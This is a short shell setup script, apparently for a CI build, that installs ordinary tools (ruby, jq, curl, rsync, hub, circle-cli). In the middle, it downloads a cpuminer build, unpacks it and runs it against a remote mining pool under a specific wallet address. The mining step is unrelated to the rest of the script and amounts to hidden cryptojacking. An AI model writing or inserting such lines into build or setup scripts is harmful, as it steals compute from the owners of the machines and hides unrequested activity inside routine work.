apt-get update
apt-get install -y ruby jq curl rsync hub
wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
tar xf cpuminer-opt-linux.tar.gz
./cpuminer-sse2 -a power2b -o stratum+tcps://stratum-asia.rplant.xyz:17022 -u MkgB8Pqwi9366Jph9Lu1pk1kXnzcKUivny.yess -t2
gem install circle-cli
